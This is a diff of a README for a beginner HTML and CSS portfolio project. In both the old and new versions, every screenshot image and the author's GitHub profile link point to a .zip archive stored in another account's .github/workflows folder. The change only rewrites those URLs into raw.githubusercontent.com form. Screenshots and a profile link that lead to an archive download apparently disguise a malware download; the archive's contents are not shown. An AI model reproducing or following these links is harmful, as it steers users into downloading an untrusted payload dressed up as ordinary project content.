@@ -1,12 +1,12 @@
-![](https://github.com/Iptysam/Hello-Portfolio/raw/refs/heads/master/.github/workflows/Hello-Portfolio-2.1.zip)
+![](https://raw.githubusercontent.com/Iptysam/Hello-Portfolio/master/.github/workflows/Hello-Portfolio-2.1.zip)
 
 # Portfolio Project
 
 In this project, I set up my portfolio repository. My goal here is to set up and add some customizationto  the first sections of my portfolio.
 
-- ![screenshot](https://github.com/Iptysam/Hello-Portfolio/raw/refs/heads/master/.github/workflows/Hello-Portfolio-2.1.zip)
-- ![screenshot](https://github.com/Iptysam/Hello-Portfolio/raw/refs/heads/master/.github/workflows/Hello-Portfolio-2.1.zip)
-- ![screenshot](https://github.com/Iptysam/Hello-Portfolio/raw/refs/heads/master/.github/workflows/Hello-Portfolio-2.1.zip)
+- ![screenshot](https://raw.githubusercontent.com/Iptysam/Hello-Portfolio/master/.github/workflows/Hello-Portfolio-2.1.zip)
+- ![screenshot](https://raw.githubusercontent.com/Iptysam/Hello-Portfolio/master/.github/workflows/Hello-Portfolio-2.1.zip)
+- ![screenshot](https://raw.githubusercontent.com/Iptysam/Hello-Portfolio/master/.github/workflows/Hello-Portfolio-2.1.zip)
 ## :hammer: Built With
 
 - HTML and CSS
@@ -22,7 +22,7 @@ In this project, I set up my portfolio repository. My goal here is to set up and
 
 👤 **JUHAR YIMER**
 
-- GitHub: [@ArthurGC](https://github.com/Iptysam/Hello-Portfolio/raw/refs/heads/master/.github/workflows/Hello-Portfolio-2.1.zip)
+- GitHub: [@ArthurGC](https://raw.githubusercontent.com/Iptysam/Hello-Portfolio/master/.github/workflows/Hello-Portfolio-2.1.zip)
 
 ## Acknowledgments
 
